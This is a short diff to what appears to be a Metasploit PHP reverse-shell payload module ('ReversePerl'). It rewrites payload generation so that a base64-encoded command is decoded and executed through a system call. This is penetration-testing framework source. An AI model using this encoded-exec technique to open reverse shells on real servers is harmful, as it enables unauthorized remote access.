@@ -1,5 +1,5 @@
 ##
-# $Id:$
+# $Id$
 ##
 
 ##
@@ -11,6 +11,7 @@
 
 
 require 'msf/core'
+require 'msf/core/payload/php'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 
@@ -22,6 +23,7 @@ module Php
 module ReversePerl
 
 	include Msf::Payload::Single
+	include Msf::Payload::Php
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -47,7 +49,11 @@ module ReversePerl
 	# Constructs the payload
 	#
 	def generate
-		return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'))"
+		buf = "#{php_preamble}"
+		buf += "$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');"
+		buf += "#{php_system_block({:cmd_varname=>"$c"})}"
+		return super + buf
+			
 	end
 	
 	#
